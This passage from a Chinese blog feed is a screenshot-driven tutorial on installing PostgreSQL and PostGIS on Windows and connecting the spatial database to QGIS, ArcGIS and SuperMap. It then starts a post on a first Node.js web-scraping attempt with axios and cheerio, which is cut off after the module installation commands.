        <content type="html"><![CDATA[<h1 id="一、postgreSQL安装"><a href="#一、postgreSQL安装" class="headerlink" title="一、postgreSQL安装"></a>一、postgreSQL安装</h1><p>放出两个网址，一个官网，一个下载地址</p><ol><li><a href="https://www.postgresql.org/" target="_blank" rel="noopener">官网地址</a></li><li><a href="https://www.enterprisedb.com/downloads/postgres-postgresql-downloads" target="_blank" rel="noopener">安装包下载地址</a></li></ol><ul><li>在这里，因为postgis版本要求的原因，我们选择9.6的安装包进行下载</li></ul><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/628baaad6aa816f2e003d96a11419ba6.png" alt></p><ul><li><p>在下载好的安装包目录下，右键安装包，以管理员身份运行</p></li><li><p>等待初始化（有的电脑可能会很快，闪过这个初始化）</p></li></ul><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/d01bf77f8b8c476deeb4f55dd8d95810.png" alt></p><ul><li><p>修改安装路径，点击next</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/e5214b90558305fd977d6234ea4c72a5.png" alt></p></li><li><p>在这里输入自己定义的管理员用户密码（记得做好记录保存好密码）</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/b2685eca6c0318524546d454eb23a8e4.png" alt></p></li><li><p>修改端口号(建议保持默认,并记住该端口号)</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/9ba2199b8cea19d35d03207c4f2d40ab.png" alt></p></li><li><p>其它默认并next</p></li><li><p>开始安装</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/ffc03e2e0f883de354832d1149bdeaa7.png" alt></p></li><li><p>安装完成,点击退出,此时可能会弹出构建器(尝试过在里面安装postGIS但是显示连接失败)</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/ff8710744dc8cd9c95b1b1d4ba8ddb28.png" alt></p></li><li><p>打开pgAdmin验证是否成功</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/81b75b1b9a584016ab57449a3142fe8f.png" alt></p></li><li><p>在弹出框输入安装时写入的密码,进行登录</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/f1692b35e3ae440af2b5e8cb794495f6.png" alt></p></li><li><p>成功连接并进入数据库</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/e35ddbe959eef21524da3dff86e65fe3.png" alt></p></li></ul><h1 id="二、postGIS安装"><a href="#二、postGIS安装" class="headerlink" title="二、postGIS安装"></a>二、postGIS安装</h1><p>可以到<a href="http://postgis.net/" target="_blank" rel="noopener">官网</a>查看相关文档以及介绍</p><ol><li><p><a href="http://download.osgeo.org/postgis/windows/" target="_blank" rel="noopener">下载页面</a>(选择合适的版本)</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/404841c93d9046fdf02b1fa906be85ae.png" alt></p></li><li><p>选择符合自己操作系统的版本</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/40de4e97289256ab50c7c4759c1dc9c4.png" alt></p></li><li><p>下载完成后，右键安装包，管理员身份安装</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/9cdff4be940eba9c565db09e4d23e38f.png" alt></p></li><li><p>将空间数据库模块勾选上</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/9d714a261b8365b5b5eb8306dd669285.png" alt></p></li><li><p>安装路径（这里要注意，安装的路径必须是之前安装的postgreSQL安装路径下）</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/7ffd22c124364729ca2894532d7e8397.png" alt></p></li><li><p>输入账户密码以及端口</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/580633362ac5392db306a95d5da81162.png" alt></p></li><li><p>修改创建的gis数据库名字（可以不改）</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/db7571d82059f8e9261b694b5c9bb07a.png" alt></p></li><li><p>等待安装（过程会有许多需要你确认的弹窗，点击是即可）</p></li><li><p>安装成功并查看该数据库</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/221b18141b2ad548166487ee861f1c12.png" alt></p></li></ol><h1 id="三、安装QGIS"><a href="#三、安装QGIS" class="headerlink" title="三、安装QGIS"></a>三、安装QGIS</h1><ol><li><p>下载安装包</p><p><a href="https://www.qgis.org/zh-Hans/site/" target="_blank" rel="noopener">官方中文网</a></p></li><li><p>下载完后，右键以管理员身份运行</p><p>点击next之后agree（同意协议）</p></li><li><p>修改安装路径</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/b16aeab9c0cef73316e0c1e28648c601.png" alt></p><ol start="4"><li>将所有模块勾选上，点击安装</li></ol><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/af15f7fe2f4c3d7587215939053e1b71.png" alt></p><ol start="5"><li>安装界面</li></ol><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/7e970c91fdb688984e1f017f3310a19c.png" alt></p><ol start="6"><li>过程中弹出是否下载安装，点击确认</li></ol><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/d771684ab69baf5c39c24ceaeae146e6.png" alt></p><ol start="7"><li>显示connect</li></ol><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/9d3f336523dcac09593a551d77a04d08.png" alt></p><ol start="8"><li>点击确认（可能因为网络的问题，过程中有两个模块下载安装不了）</li></ol><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/23c7f8726acdfd9034501e8a0db9578f.png" alt></p><ol start="9"><li>继续下个模块安装</li></ol><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/ebbff3c72bd1d981e77fe06ee5bfa695.png" alt></p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/288d942b942f1bb47b7625fa634350f2.png" alt></p><ol start="10"><li><p>单击finish（最终可能会有两个模块安装不上，一个可以，但目前为止不影响使用）</p></li><li><p>打开测试</p></li></ol><h1 id="四、新建空间数据库"><a href="#四、新建空间数据库" class="headerlink" title="四、新建空间数据库"></a>四、新建空间数据库</h1><ol><li><p>进入pgAdmin中，创建新数据库</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20200916203900848.png" alt="image-20200916203900848"></p></li><li><p>在弹窗处填入相关配置，单击save</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20200916204055592.png" alt="image-20200916204055592"></p></li><li><p>创建成功</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20200916204322023.png" alt="image-20200916204322023"></p></li><li><p>单击SQL查询按钮，填写代码</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20200916204538711.png" alt="image-20200916204538711"></p></li><li><p>在查询文本区域中输入以下查询语句以加载<strong>PostGIS空间扩展</strong>,按f5执行</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> EXTENSION postgis;</span><br></pre></td></tr></table></figure><p> <img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20200916204706151.png" alt="image-20200916204706151"></p></li><li><p>显示以下弹窗说明成功</p><p> <img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20200916204738830.png" alt="image-20200916204738830"></p></li><li><p>接着，通过运行PostGIS函数来确认是否在数据库中安装了PostGIS扩展插件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> postgis_full_version();</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20200916205014930.png" alt="image-20200916205014930"></p></li><li><p>到此，就成功的创建了postGIS数据库</p></li><li><p>接着在QGIS连接该数据库并导入要素</p></li></ol><h1 id="五、QGIS连接PostGIS"><a href="#五、QGIS连接PostGIS" class="headerlink" title="五、QGIS连接PostGIS"></a>五、QGIS连接PostGIS</h1><ol><li><p>打开QGIS,在目录列表内查找到PostGIS，右键,新建连接</p></li><li><p>填入相关配置(连接的数据库必须是配置了postGIS的数据库）</p><ul><li>名称随意</li><li>服务可以不填</li><li>主机名字默认是localhost</li><li>数据库就是你配置了postgis的数据库</li></ul><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/f1bb8110e3acd4cbf86fdd9ee289b294.png" alt></p></li><li><p>这里表示连接成功,并且会显示默认创建的public表</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/e991d8ad299d248edee8168ad368359f.png" alt></p></li><li><p>将你要导入的要素拖入数据库,完成空间数据入库</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/61ab8f818903fbc8fc33529784aa69bb.png" alt></p></li><li><p>打开pgadmin4，在postgis数据库下即可查看刚才新建的要素表以及导入的要素名称</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/cce885bb2e6283337b34a98e7e80f290.png" alt></p></li><li><p>右键该要素,view/edit data →all rows</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/9713546928e619f12a310a869aa4fc84.png" alt></p></li><li><p>在Data Output窗口,点击geom后点击小眼睛,即可在Geometry<br>Viewer中查看该要素的分布情况,并可以使用select语句进行相关空间查询</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/a5bf8c6c84d64a2ccab45214adc2a1c9.png" alt></p></li></ol><h1 id="六、Arcgis连接PostGIS"><a href="#六、Arcgis连接PostGIS" class="headerlink" title="六、Arcgis连接PostGIS"></a>六、Arcgis连接PostGIS</h1><h2 id="ArcGIS10-2连接PostGIS"><a href="#ArcGIS10-2连接PostGIS" class="headerlink" title="ArcGIS10.2连接PostGIS"></a>ArcGIS10.2连接PostGIS</h2><blockquote><p>这边测试的postgresql版本为9.6，arcgis版本为10.2（建议postgresql选择9.2版本，如果选择9.6，则目前只能连接数据库以及查看以及导出里面的空间数据，但是无法修改数据库的要素以及在数据库中创建要素）</p></blockquote><ol><li><p>下载ArcGIS客户端所需要的<strong>postgresql32位库</strong>(选择对应版本的<a href="https://www.enterprisedb.com/download-postgresql-binaries" target="_blank" rel="noopener">32位包</a>)，将下载后的postgresql9.2 32位对应的dll文件复制到arcgis安装目录下Desktop10.2\bin文件夹内</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015151025365.png" alt="所需要的dll文件"></p></li><li><p>打开ArcGIS，在目录选择【数据库连接】→【添加数据库连接】</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015151200221.png" alt="image-20201015151200221"></p></li><li><p>在弹窗处选择数据库平台为postgreSQL，实例填写localhost，填写数据库用户名以及密码，成功连接后即可选择你要连接的数据库</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015151308339.png" alt="image-20201015151308339"></p></li><li><p>可以看到先前从QGIS导入数据库的要素集合</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015151444131.png" alt="image-20201015151444131"></p></li><li><p>将其中一个拖拽至窗口，可以看到数据库里面的空间要素</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015151607785.png" alt="image-20201015151607785"></p></li><li><p>若数据过大，可能会计算一定时间的空间范围</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015151546469.png" alt="image-20201015151546469"></p></li></ol><h2 id="ArcGIS10-7连接postgis"><a href="#ArcGIS10-7连接postgis" class="headerlink" title="ArcGIS10.7连接postgis"></a>ArcGIS10.7连接postgis</h2><blockquote><p>arcgis10.7支持postgresql9.6及以上版本，可以进行空间数据的增删改查完整操作</p></blockquote><p>操作步骤</p><ol><li><p>在arcgis10.7安装的目录下定位到DatabaseSupport\PostgreSQL，将里面的9.6文件夹内的dll文件复制一份</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015160413977.png" alt="image-20201015160413977"></p></li><li><p>将复制的文件放到postgresql9.6安装目录下的lib文件夹内</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015160608970.png" alt="image-20201015160608970"></p></li><li><p>启动arcgis10.7，打开【创建企业级地理数据库】工具</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015160755942.png" alt="image-20201015160755942"></p></li><li><p>在弹窗处填写相关配置</p><p><strong>这里的授权文件路径为安装完arcgis server后”安装磁盘（默认C盘）\ESRI\License\sysgen”文件夹中，是一个名为keycodes的文件（请不要被下面的授权文件路径误导）</strong></p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/image-20201015161149789.png" alt="image-20201015161149789"></p></li><li><p>成功连接后，就可以在ArcGIS【目录】处同【6.1】的步骤一样连接创建的企业级地理数据库，且可在里面进行创建、修改、以及查询要素等操作</p></li></ol><h1 id="七、SuperMap连接PostgreSQL数据库"><a href="#七、SuperMap连接PostgreSQL数据库" class="headerlink" title="七、SuperMap连接PostgreSQL数据库"></a>七、SuperMap连接PostgreSQL数据库</h1><blockquote><p>软件： </p><ol><li><p>PostgreSQL10</p></li><li><p>对应版本的Postgis</p></li><li><p>SuperMap iDesktop 10i</p></li></ol></blockquote><p>步骤</p><ol><li><p>新建数据库型数据源</p><p>打开SuperMap iDesktop 10i，在工作空间管理器中找到数据源，单击右键选择“新建数据库型数据源”。</p></li></ol><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/clip_image002.gif" alt="img"></p><p>​    在弹出的对话框中，数据库型选择PostGIS；服务器名称输入localhost；数据库名称与数据源别名为自定义名称（这里设置为GIS）；使用安装时所创建的用户，用户名称为postgres，并输入密码，最后点击创建。数    据源则完成创建。</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/clip_image004.gif" alt="img"></p><ol start="2"><li><p><strong>存储空间数据</strong></p><p>选择所创建的数据源，单击右键，通过新建数据集或导入数据集即可将空间数据存储在数据源当中，也就是对应存储在数据库中。</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/clip_image006.gif" alt="img"></p></li><li><p><strong>刷新数据库节点</strong></p><p>打开pgAdmin，刷新数据库节点就可以看到新增的数据库。</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/clip_image008.gif" alt="img"></p></li></ol><p>​    同时在目录管理当中也能看到所连接的数据库。</p><p><img src= "/img/loading.gif" data-src="/2020/11/10/postGIS%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E5%92%8C%E5%90%84%E4%B8%BB%E6%B5%81GIS%E8%BD%AF%E4%BB%B6%E8%BF%9E%E6%8E%A5%E6%B5%8B%E8%AF%95/clip_image010.gif" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> PostgreSQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PostgreSQL </tag>
            
            <tag> GIS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记第一次尝试使用node进行爬虫的经历</title>
      <link href="/2020/08/13/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8node%E8%BF%9B%E8%A1%8C%E7%88%AC%E8%99%AB%E7%9A%84%E7%BB%8F%E5%8E%86/"/>
      <url>/2020/08/13/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8node%E8%BF%9B%E8%A1%8C%E7%88%AC%E8%99%AB%E7%9A%84%E7%BB%8F%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这是我第一次尝试爬虫，也是第一次使用node.js爬虫，有啥不正确的望各位大佬多多指教。</p><p>本实验是基于nodejs中，使用cheerio模块实现简单爬取网站所需信息，因为在次实例中（本次实例的<a href="https://www.ruyile.com/xuexiao/?a=3120" target="_blank" rel="noopener">网址</a>）需要做到写入文件以及启动我们自己的服务（可能不用）和创建http请求，所以还需要用到另外三个模块，fs、express以及axios</p><h1 id="模块安装"><a href="#模块安装" class="headerlink" title="模块安装"></a>模块安装</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm init -y <span class="comment">#跳过向导，快速生成package.json说明书文件</span></span><br><span class="line">npm i --save axios</span><br><span class="line">npm i --save express</span><br><span class="line">npm i --save cheerio</span><br></pre></td></tr></table></figure><blockquote><h2 id="axios简介"><a href="#axios简介" class="headerlink" title="axios简介"></a>axios简介</h2><p>Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中</p><p><a href="http://www.axios-js.com/zh-cn/docs/" target="_blank" rel="noopener">axios文档</a></p><h2 id="cheerio简介"><a href="#cheerio简介" class="headerlink" title="cheerio简介"></a>cheerio简介</h2><p>Fast, flexible &amp; lean implementation of core jQuery designed specifically for the server.</p><p><a href="https://cheerio.js.org/" target="_blank" 